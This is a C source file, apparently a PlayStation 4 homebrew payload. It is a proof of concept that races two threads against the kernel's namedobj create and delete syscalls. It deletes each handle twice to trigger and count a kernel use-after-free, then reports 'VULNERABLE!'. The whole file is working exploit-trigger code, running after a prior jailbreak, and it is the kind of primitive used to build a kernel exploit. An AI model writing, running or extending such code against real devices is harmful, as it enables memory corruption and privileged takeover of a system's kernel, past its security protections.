#include "ps4.h"

#define SYS_NAMEDOBJ_CREATE 557
#define SYS_NAMEDOBJ_DELETE 558

static int namedobj_create(const char* name,
                            int data,
                            uint32_t flags) {
    return syscall(SYS_NAMEDOBJ_CREATE, name, data, flags);
}

static int namedobj_delete(uint32_t handle,
                            uint16_t flags) {
    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
}

static volatile int g_handle  = -1;
static volatile int g_running =  1;
static volatile int g_hits    =  0;

void* thread_delete(void* arg) {
    printf_debug("thread_delete start\n");
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;

        g_handle = -1;

        
        int r1 = namedobj_delete(h, 0x107);

        int r2 = namedobj_delete(h, 0x107);

        printf_debug("r1=%d r2=%d h=0x%x\n", r1, r2, h);

        if (r2 == 0) {
            g_hits++;
            printf_debug("[!!!] UAF HIT #%d\n", g_hits);
        }
    }
    printf_debug("thread_delete exit\n");
    return NULL;
}

void* thread_create(void* arg) {
    printf_debug("thread_create start\n");
    while (g_running) {
        
        int fd = sceNetSocket("poc",
                              AF_INET,
                              SOCK_STREAM, 0);
        if (fd < 0) continue;

        int h = namedobj_create("poc_uaf", fd, 0x107);
        if (h == -1) {
            sceNetSocketClose(fd);
            continue;
        }

        g_handle = h;

        
        while (g_handle != -1 && g_running)
            sceKernelUsleep(10);

        sceNetSocketClose(fd);
    }
    printf_debug("thread_create exit\n");
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);
    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    ScePthread tA, tB;
    printf_debug("=== namedobj test ===\n");

    scePthreadCreate(&tA, NULL, thread_create, NULL, "creator");
    scePthreadCreate(&tB, NULL, thread_delete, NULL, "deleter");

    sceKernelSleep(30);
    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);

    printf_debug("Total hits: %d\n", g_hits);
    if (g_hits > 0) {
        printf_debug("[+] VULNERABLE!\n");
    } else {
        printf_debug("[-] No hits\n");
    }
    return 0;
}